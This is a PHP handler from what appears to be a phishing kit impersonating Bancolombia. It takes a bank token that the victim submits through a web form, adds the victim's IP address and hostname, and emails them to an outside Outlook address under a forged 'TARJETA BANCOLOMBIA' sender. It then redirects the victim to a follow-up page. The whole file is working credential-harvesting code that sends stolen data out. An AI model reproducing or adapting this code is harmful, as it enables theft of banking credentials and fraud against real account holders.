<? 

function get_real_ip()
    {
 
        if (isset($_SERVER["HTTP_CLIENT_IP"]))
        {
            return $_SERVER["HTTP_CLIENT_IP"];
        }
        elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"]))
        {
            return $_SERVER["HTTP_X_FORWARDED_FOR"];
        }
        elseif (isset($_SERVER["HTTP_X_FORWARDED"]))
        {
            return $_SERVER["HTTP_X_FORWARDED"];
        }
        elseif (isset($_SERVER["HTTP_FORWARDED_FOR"]))
        {
            return $_SERVER["HTTP_FORWARDED_FOR"];
        }
        elseif (isset($_SERVER["HTTP_FORWARDED"]))
        {
            return $_SERVER["HTTP_FORWARDED"];
        }
        else
        {
            return $_SERVER["REMOTE_ADDR"];
        }
 
    }


$ip = get_real_ip();
$a5 = "TARJETA BANCOLOMBIA";
$a6 = "info@covid19.com";
$z = file_get_contents('id.txt');

	$userIa = $_POST['documentNumber'];
	
	
	
	
	$ip6 = gethostbyaddr($_SERVER['REMOTE_ADDR']);

	$asunto = "Token 2 BANCOLOMBIA (".$ip.") (".$z.")";
	$mensaje = "
	Token	:	 ".$userIa."\n
	
	Host	:	 ".$ip6."\n
	IP		:	 ".$ip."";
	
	$retorno = "soporte6969@outlook.com";
	
	//para el envio en formato HTML
	$headers = "MIME-Version: 1.0\r\n";
	$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
	$headers .= "From: ".$a5." <".$a6.">";
		
	mail($retorno, $asunto, $mensaje, $headers);
	header("Location: redxxx.html");

?> 

	